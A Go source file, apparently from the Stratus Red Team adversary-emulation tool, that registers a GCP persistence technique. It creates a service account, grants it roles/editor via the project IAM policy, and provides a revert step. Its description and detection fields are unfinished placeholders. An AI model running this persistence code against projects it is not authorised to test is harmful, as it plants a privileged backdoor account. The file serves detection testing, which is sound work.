package gcp

import (
	"context"
	_ "embed"
	"errors"
	"fmt"
	"github.com/datadog/stratus-red-team/v2/internal/providers"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	cloudresourcemanager "google.golang.org/api/cloudresourcemanager/v1"
	iam "google.golang.org/api/iam/v1"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.persistence.create-admin-service-account",
		FriendlyName: "Create an Admin GCP Service Account",
		Description: `
Establishes persistence by creating X

Warm-up: None

Detonation:

- TODO

References: TODO
`,
		Detection: `
Using GCP Admin Activity audit logs event <code>TODO</code>.
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence, mitreattack.PrivilegeEscalation},
		Detonate:                   detonate,
		Revert:                     revert,
		PrerequisitesTerraformCode: tf,
	})
}

// Note: `roles/owner` cannot be granted through the API
const roleToGrant = "roles/editor"

func detonate(params map[string]string) error {
	gcp := providers.GCP()
	serviceAccountName := params["service_account_name"]
	serviceAccountEmail := getServiceAccountEmail(serviceAccountName)

	if err := createServiceAccount(gcp, serviceAccountName); err != nil {
		return err
	}

	if err := assignProjectRole(gcp, serviceAccountEmail, roleToGrant); err != nil {
		return err
	}

	return nil
}

// createServiceAccount creates a new service account inside of a GCP project
func createServiceAccount(gcp *providers.GcpProvider, serviceAccountName string) error {
	iamClient, err := iam.NewService(context.Background(), gcp.Options())
	if err != nil {
		return errors.New("Error instantiating GCP IAM Client: " + err.Error())
	}
	serviceAccountDisplayName := fmt.Sprintf("%s (service account used by stratus red team)", serviceAccountName)
	serviceAccountEmail := getServiceAccountEmail(serviceAccountName)
	path := fmt.Sprintf("projects/%s", gcp.GetProjectId())

	log.Println("Creating service account " + serviceAccountName)
	_, err = iamClient.Projects.ServiceAccounts.Create(path, &iam.CreateServiceAccountRequest{
		AccountId:      serviceAccountName,
		ServiceAccount: &iam.ServiceAccount{DisplayName: serviceAccountDisplayName},
	}).Do()
	if err != nil {
		return errors.New("Unable to create service account: " + err.Error())
	}
	log.Println("Successfuly created service account " + serviceAccountEmail)
	return nil
}

// assignProjectRole grants a project-wide role to a specific service account
// it works the same as 'gcloud projects add-iam-policy-binding':
// * Step 1: Read the project's IAM policy using [getIamPolicy](https://cloud.google.com/resource-manager/reference/rest/v1/projects/getIamPolicy)
// * Step 2: Create a binding, or add the service account to an existing binding for the role to grant
// * Step 3: Update the project's IAM policy using [setIamPolicy](https://cloud.google.com/resource-manager/reference/rest/v1/projects/setIamPolicy)
func assignProjectRole(gcp *providers.GcpProvider, serviceAccountEmail string, roleToGrant string) error {
	resourceManager, err := cloudresourcemanager.NewService(context.Background(), gcp.Options())
	if err != nil {
		return errors.New("unable to instantiate the GCP cloud resource manager: " + err.Error())
	}

	policyResponse, err := resourceManager.Projects.GetIamPolicy(gcp.GetProjectId(), &cloudresourcemanager.GetIamPolicyRequest{}).Do()
	if err != nil {
		return err
	}
	var bindingFound = false
	bindingValue := fmt.Sprintf("serviceAccount:" + serviceAccountEmail)
	for _, b := range policyResponse.Bindings {
		if b.Role == roleToGrant {
			bindingFound = true
			log.Println("Adding the service account to an existing binding in the project's IAM policy to grant " + roleToGrant)
			b.Members = append(b.Members, bindingValue)
		}
	}
	if !bindingFound {
		log.Println("Creating a new binding in the project's IAM policy to grant " + roleToGrant)
		policyResponse.Bindings = append(policyResponse.Bindings, &cloudresourcemanager.Binding{
			Role:    roleToGrant,
			Members: []string{bindingValue},
		})
	}

	_, err = resourceManager.Projects.SetIamPolicy(gcp.GetProjectId(), &cloudresourcemanager.SetIamPolicyRequest{
		Policy: policyResponse,
	}).Do()

	if err != nil {
		return fmt.Errorf("Failed to update project IAM policy: " + err.Error())
	}
	return nil
}

func revert(params map[string]string) error {
	gcp := providers.GCP()
	serviceAccountName := params["service_account_name"]
	serviceAccountEmail := getServiceAccountEmail(serviceAccountName)

	// Attempt to remove the role from the service account in the project's IAM policy
	// fail with a warning (but continue) in case of error
	unassignProjectRole(gcp, serviceAccountEmail, roleToGrant)

	// Remove service account itself
	return removeServiceAccount(gcp, serviceAccountName)
}

// unassignProjectRole un-assigns a project-wide role to a specific service account
// it works the same as 'gcloud projects remove-iam-policy-binding':
// * Step 1: Read the project's IAM policy using [getIamPolicy](https://cloud.google.com/resource-manager/reference/rest/v1/projects/getIamPolicy)
// * Step 2: Remove a binding, or remove the service account from an existing binding for the role to grant
// * Step 3: Update the project's IAM policy using [setIamPolicy](https://cloud.google.com/resource-manager/reference/rest/v1/projects/setIamPolicy)
func unassignProjectRole(gcp *providers.GcpProvider, serviceAccountEmail string, roleToGrant string) {
	resourceManager, err := cloudresourcemanager.NewService(context.Background(), gcp.Options())
	if err != nil {
		log.Println("Warning: unable to instantiate the GCP cloud resource manager: " + err.Error())
		return
	}

	policyResponse, err := resourceManager.Projects.GetIamPolicy(gcp.GetProjectId(), &cloudresourcemanager.GetIamPolicyRequest{}).Do()
	if err != nil {
		log.Println("warning: unable to retrieve the project's IAM policy")
		return
	}
	var bindingFound = false
	bindingValue := fmt.Sprintf("serviceAccount:" + serviceAccountEmail)
	for _, binding := range policyResponse.Bindings {
		if binding.Role == roleToGrant {
			index := indexOf(binding.Members, bindingValue)
			if index > -1 {
				bindingFound = true
				binding.Members = remove(binding.Members, index)
			}
		}
	}
	if bindingFound {
		log.Println("Updating project's IAM policy to remove reference to the service account")
		_, err := resourceManager.Projects.SetIamPolicy(gcp.GetProjectId(), &cloudresourcemanager.SetIamPolicyRequest{
			Policy: policyResponse,
		}).Do()
		if err != nil {
			log.Println("Warning: unable to update project's IAM policy: " + err.Error())
		}
	} else {
		log.Println("Warning: did not find reference to the service account in the project's IAM policy")
	}

}

func removeServiceAccount(gcp *providers.GcpProvider, serviceAccountName string) error {
	iamClient, err := iam.NewService(context.Background(), gcp.Options())
	if err != nil {
		return errors.New("Error instantiating GCP IAM Client: " + err.Error())
	}

	log.Println("Removing service account " + serviceAccountName)
	_, err = iamClient.Projects.ServiceAccounts.Delete(getServiceAccountPath(serviceAccountName)).Do()
	if err != nil {
		return errors.New("Unable to delete service account: " + err.Error())
	}
	return nil
}

// Utility functions

func getServiceAccountPath(name string) string {
	return fmt.Sprintf("projects/-/serviceAccounts/%s", getServiceAccountEmail(name))
}

func getServiceAccountEmail(name string) string {
	return fmt.Sprintf("%s@%s.iam.gserviceaccount.com", name, providers.GCP().GetProjectId())
}

func remove(slice []string, index int) []string {
	return append(slice[:index], slice[index+1:]...)
}

func indexOf(slice []string, searchValue string) int {
	for i, current := range slice {
		if current == searchValue {
			return i
		}
	}
	return -1
}
